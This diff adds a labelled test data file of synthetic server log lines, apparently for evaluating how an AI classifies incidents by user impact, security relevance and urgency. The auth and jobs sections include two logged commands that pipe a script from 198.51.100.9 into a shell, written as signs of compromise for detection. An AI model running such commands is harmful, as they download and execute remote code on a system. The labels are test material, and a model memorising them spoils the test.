@@ -1,0 +1,99 @@
+# Log lines, for tests/live/versus.rs. Written and labelled by Claude on 2026-09-29,
+# to be reviewed by a person. Columns: notice (would a user notice this?), security
+# (is this a security event?), today (does someone need to act on this today?), part
+# (web, database, auth, storage, network, jobs), line. 1 yes, 0 no, - a judgement call.
+notice	security	today	part	line
+1	0	1	web	2026-09-28T10:02:11Z nginx[812]: upstream timed out (110: Connection timed out) while reading response header from upstream, client: 203.0.113.7, request: "GET /checkout HTTP/1.1"
+1	0	1	web	2026-09-28T10:02:14Z nginx[812]: 502 Bad Gateway for 1,284 requests in the last minute on /api/*
+0	0	0	web	2026-09-28T10:03:00Z nginx[812]: GET /healthz 200 0.001s
+0	0	0	web	2026-09-28T10:03:05Z nginx[812]: GET /static/app.css 304 0.002s
+0	0	0	web	2026-09-28T10:04:17Z app[2231]: rendered dashboard for user 4412 in 184ms
+-	0	0	web	2026-09-28T10:05:40Z app[2231]: slow request: GET /reports took 4.8s (threshold 2s)
+1	0	1	web	2026-09-28T10:06:02Z app[2231]: unhandled exception in POST /orders: NullPointerException at OrderService.java:212; 38 occurrences in 5 min
+0	0	0	web	2026-09-28T10:06:30Z app[2231]: cache warmed: 12,403 keys in 2.1s
+1	0	1	database	2026-09-28T10:07:12Z postgres[91]: FATAL: remaining connection slots are reserved for non-replication superuser connections
+0	0	0	database	2026-09-28T10:07:45Z postgres[91]: checkpoint complete: wrote 2,114 buffers (1.6%); write=2.1 s
+-	0	-	database	2026-09-28T10:08:03Z postgres[91]: duration: 3412 ms  statement: SELECT * FROM invoices WHERE customer_id = 88
+0	0	0	database	2026-09-28T10:08:20Z postgres[91]: autovacuum: processing table public.events
+0	0	-	database	2026-09-28T10:09:01Z postgres[91]: replication lag on replica-2 is 42s
+1	0	1	database	2026-09-28T10:09:33Z postgres[91]: PANIC: could not write to file "pg_wal/xlogtemp.91": No space left on device
+0	0	0	database	2026-09-28T10:10:00Z db-backup: nightly backup of orders-db finished, 18.2 GB in 21 min
+0	0	1	database	2026-09-28T10:10:12Z db-backup: backup of billing-db FAILED: pg_dump exited with code 1 (third night in a row)
+0	1	1	auth	2026-09-28T10:11:02Z sshd[4410]: Failed password for root from 198.51.100.23 port 52211 ssh2 (attempt 412 in 10 min)
+0	1	1	auth	2026-09-28T10:11:20Z sshd[4410]: Accepted password for root from 198.51.100.23 port 52290 ssh2
+0	0	0	auth	2026-09-28T10:11:45Z sshd[4410]: Accepted publickey for deploy from 10.0.4.12 port 40022 ssh2
+0	-	0	auth	2026-09-28T10:12:03Z sshd[4410]: Failed password for alice from 10.0.4.30 port 51000 ssh2
+0	0	0	auth	2026-09-28T10:12:30Z auth-svc: user 4412 logged in (SSO, okta)
+0	0	0	auth	2026-09-28T10:12:31Z auth-svc: user 4412 logged out
+0	1	1	auth	2026-09-28T10:13:10Z auth-svc: 9,812 failed logins from 47 IPs against 3,300 accounts in 5 min (credential stuffing suspected)
+0	1	1	auth	2026-09-28T10:13:40Z auth-svc: API key sk_live_…9f2 used from a new country (RU) for the first time; key belongs to admin@acme.example
+-	0	0	auth	2026-09-28T10:14:02Z auth-svc: password reset email sent to user 5120
+0	1	-	auth	2026-09-28T10:14:30Z auth-svc: user 7731 granted role "owner" by user 7731
+1	0	1	auth	2026-09-28T10:15:00Z auth-svc: SSO provider okta returned 503; all SSO logins failing
+0	0	0	auth	2026-09-28T10:15:20Z auth-svc: session store compacted, 3,002 expired sessions removed
+0	1	1	auth	2026-09-28T10:16:01Z sudo: www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash -c curl http://198.51.100.9/x.sh | sh
+0	0	0	auth	2026-09-28T10:16:30Z sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/bin/systemctl restart app
+1	0	1	storage	2026-09-28T10:17:00Z kernel: EXT4-fs error (device nvme0n1p2): ext4_find_entry:1455: inode #262147: comm app: reading directory lblock 0
+0	0	-	storage	2026-09-28T10:17:30Z node-exporter: disk /var at 87% (warn 85%)
+1	0	1	storage	2026-09-28T10:18:02Z app[2231]: upload failed for user 5120: s3 PutObject AccessDenied
+0	0	0	storage	2026-09-28T10:18:40Z s3-sync: 3,211 objects copied to eu-west-1 replica
+0	0	0	storage	2026-09-28T10:19:05Z logrotate: rotated /var/log/app/*.log (14 files)
+0	1	1	storage	2026-09-28T10:19:30Z s3-audit: bucket acme-customer-exports policy changed to public-read by user ci-bot
+0	0	0	storage	2026-09-28T10:20:00Z tmp-cleaner: removed 812 files older than 7 days from /tmp
+1	0	1	network	2026-09-28T10:20:30Z haproxy[77]: backend api has no server available!
+0	0	0	network	2026-09-28T10:21:00Z haproxy[77]: Server api/api-3 is UP, reason: Layer7 check passed
+-	0	-	network	2026-09-28T10:21:12Z haproxy[77]: Server api/api-2 is DOWN, reason: Layer4 timeout; 2 active servers left
+1	0	1	network	2026-09-28T10:22:00Z cert-manager: certificate for app.acme.example expired at 10:00 UTC; renewal failed: ACME challenge timed out
+0	0	-	network	2026-09-28T10:22:30Z cert-manager: certificate for api.acme.example expires in 6 days; renewal will be attempted
+0	0	0	network	2026-09-28T10:23:00Z cert-manager: certificate for www.acme.example renewed, valid until 2026-12-27
+1	0	1	network	2026-09-28T10:23:40Z coredns: SERVFAIL for api.acme.example: 100% of queries in the last 2 min
+0	1	-	network	2026-09-28T10:24:10Z ufw: [UFW BLOCK] IN=eth0 SRC=192.0.2.44 DST=10.0.1.5 PROTO=TCP DPT=3306 (port scan, 1,024 ports in 30 s)
+0	0	0	network	2026-09-28T10:24:30Z ufw: [UFW ALLOW] IN=eth0 SRC=10.0.4.12 DST=10.0.1.5 PROTO=TCP DPT=22
+-	0	0	network	2026-09-28T10:25:00Z app[2231]: retrying call to payments-api (attempt 2 of 3): connection reset by peer
+1	0	1	network	2026-09-28T10:25:02Z app[2231]: payments-api unreachable after 3 attempts; checkout disabled
+0	0	0	jobs	2026-09-28T10:26:00Z cron[1]: (root) CMD (/usr/local/bin/cleanup-sessions)
+0	0	-	jobs	2026-09-28T10:26:30Z scheduler: job weekly-report failed: timeout after 600s; will retry at 11:00
+0	0	0	jobs	2026-09-28T10:27:00Z scheduler: job index-rebuild finished in 12m04s
+1	0	1	jobs	2026-09-28T10:27:30Z scheduler: job send-invoices failed for all 1,902 customers: SMTP auth error
+-	0	0	jobs	2026-09-28T10:28:00Z worker[3]: queue emails has 12,003 pending messages (usual: < 500)
+0	0	0	jobs	2026-09-28T10:28:30Z worker[3]: processed 500 messages from queue thumbnails
+0	0	0	jobs	2026-09-28T10:29:00Z scheduler: job nightly-export started
+0	0	-	jobs	2026-09-28T10:29:30Z worker[5]: OOMKilled; restarted (restart 4 in 1 h)
+1	0	1	web	2026-09-28T10:30:00Z app[2231]: feature flag new-editor enabled for 100% of users; error rate on /editor rose from 0.1% to 34%
+0	0	0	web	2026-09-28T10:30:30Z app[2231]: feature flag dark-mode enabled for 10% of users
+0	0	0	web	2026-09-28T10:31:00Z deploy: release v4.18.2 rolled out to 12/12 pods
+1	0	1	web	2026-09-28T10:31:30Z deploy: release v4.18.3 rollout stuck: 3/12 pods CrashLoopBackOff; serving mixed versions
+0	0	0	web	2026-09-28T10:32:00Z app[2231]: config reloaded (no changes)
+0	-	0	web	2026-09-28T10:32:30Z app[2231]: 404 for GET /wp-login.php from 198.51.100.77
+0	1	-	web	2026-09-28T10:33:00Z waf: blocked 214 requests with SQL injection patterns from 203.0.113.50 on /search
+0	1	1	web	2026-09-28T10:33:30Z app[2231]: request to /admin/export by user 9001 returned 200 but user 9001 has role "viewer"
+-	0	0	web	2026-09-28T10:34:00Z app[2231]: deprecated API v1 called 3,112 times today by 14 clients
+0	0	0	web	2026-09-28T10:34:30Z app[2231]: sitemap regenerated (4,120 urls)
+1	0	-	web	2026-09-28T10:35:00Z app[2231]: search index is 3 hours behind; new documents not searchable
+0	0	0	database	2026-09-28T10:35:30Z migrate: applied migration 0142_add_index_orders_created_at in 2.3s
+1	0	1	database	2026-09-28T10:36:00Z migrate: migration 0143_drop_column_users_phone FAILED halfway; table users locked
+0	1	1	database	2026-09-28T10:36:30Z postgres[91]: connection authorized: user=postgres database=billing host=198.51.100.23
+0	0	0	database	2026-09-28T10:37:00Z redis[55]: Background saving terminated with success
+-	0	-	database	2026-09-28T10:37:30Z redis[55]: MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk
+0	0	0	database	2026-09-28T10:38:00Z redis[55]: 1,204 keys expired in 1 s
+0	0	0	jobs	2026-09-28T10:38:30Z scheduler: job backup-configs finished
+0	1	1	auth	2026-09-28T10:39:00Z vault: root token created by user ci-bot
+0	0	0	auth	2026-09-28T10:39:30Z vault: lease for db-creds/app renewed
+0	1	-	auth	2026-09-28T10:40:00Z auth-svc: 2FA disabled for account admin@acme.example
+0	0	0	auth	2026-09-28T10:40:30Z auth-svc: new device registered for user 4412
+1	0	1	storage	2026-09-28T10:41:00Z app[2231]: attachments service returning 500 for all downloads: disk read-only
+0	0	0	storage	2026-09-28T10:41:30Z s3-lifecycle: 2,003 objects moved to glacier
+-	0	0	storage	2026-09-28T10:42:00Z app[2231]: thumbnail generation failed for 3 images: unsupported format HEIC
+0	0	0	network	2026-09-28T10:42:30Z vpn: tunnel office-lisbon re-established after 4 s
+0	0	-	network	2026-09-28T10:43:00Z vpn: tunnel office-berlin down for 25 min
+1	0	1	network	2026-09-28T10:43:30Z cdn: origin fetch errors 97% for assets.acme.example; images not loading
+0	0	0	network	2026-09-28T10:44:00Z cdn: purged 1,211 cached paths
+0	0	0	jobs	2026-09-28T10:44:30Z scheduler: 42 jobs ran, 0 failed, in the last hour
+0	0	0	jobs	2026-09-28T10:45:00Z cron[1]: (deploy) CMD (/srv/app/bin/rotate-keys --dry-run)
+0	1	1	jobs	2026-09-28T10:45:30Z cron[1]: (www-data) CMD (curl -s http://198.51.100.9/m | bash) added to crontab by www-data
+1	0	-	web	2026-09-28T10:46:00Z app[2231]: emails with links point to http://localhost:3000 since 09:40
+0	0	0	web	2026-09-28T10:46:30Z app[2231]: A/B test pricing-page-v2 reached 5,000 visitors
+1	1	1	web	2026-09-28T10:47:00Z app[2231]: users report being shown another tenant's dashboard; tenant id cache key collision suspected
+0	0	0	web	2026-09-28T10:47:30Z app[2231]: GC pause 42ms
+-	0	0	web	2026-09-28T10:48:00Z app[2231]: p95 latency 780ms (target 500ms) for the last 15 min
+0	0	0	web	2026-09-28T10:48:30Z app[2231]: warmup complete, accepting traffic
